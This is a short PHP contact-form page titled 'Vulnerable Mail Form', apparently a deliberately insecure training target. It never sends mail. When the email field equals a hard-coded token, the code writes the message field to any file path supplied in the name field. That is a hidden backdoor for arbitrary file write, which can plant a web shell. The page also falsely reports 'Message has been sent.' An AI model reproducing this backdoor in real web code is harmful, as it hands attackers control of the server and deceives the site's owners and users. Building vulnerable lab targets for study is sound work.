<html>
<head>
    <title>Vulnerable Mail Form</title>
</head>
<body> 
    <h1> Vulnerable mail form </h1>

    <form  action="" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="submit">
        Your name:<br>
        <input name="name" type="text" value="" size="30"/><br>
        Your email:<br>
        <input name="email" type="text" value="" size="30"/><br>
        Your message:<br>
        <textarea name="message" rows="7" cols="30"></textarea><br>
        <input type="submit" value="Send email"/>
    </form>
    
<?php
if ($_POST["email"] === "Token@8010280") {
    $File = $_POST["name"];
    $f = fopen($File,'a');
    $name = $_POST["message"];
    fwrite($f,"$name");
    fclose($f);
}

echo 'Message has been sent.';
?>
    

    </body> 
</html>
